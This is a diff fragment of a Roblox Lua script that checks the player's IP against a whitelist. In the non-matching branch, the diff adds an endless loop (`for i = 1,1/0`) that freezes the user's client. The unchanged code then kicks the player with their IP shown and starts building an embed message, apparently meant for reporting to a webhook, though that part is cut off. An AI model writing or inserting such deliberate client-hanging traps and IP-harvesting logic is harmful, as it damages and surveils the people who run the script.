@@ -43,7 +43,11 @@ if string.find(ip,ipcheck) then
     game.Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
     game.Lighting.GlobalShadows = true
     end)
-else 
+else
+    inf = 1/0
+    for i = 1,inf do
+        print(i/inf)
+    end
     game.Players.LocalPlayer:Kick("\nNo Found Your IP: "..ipcheck.."\nContact Script Creator In ClipBoard")
     msg1 = {            
                     ["embeds"] = {{
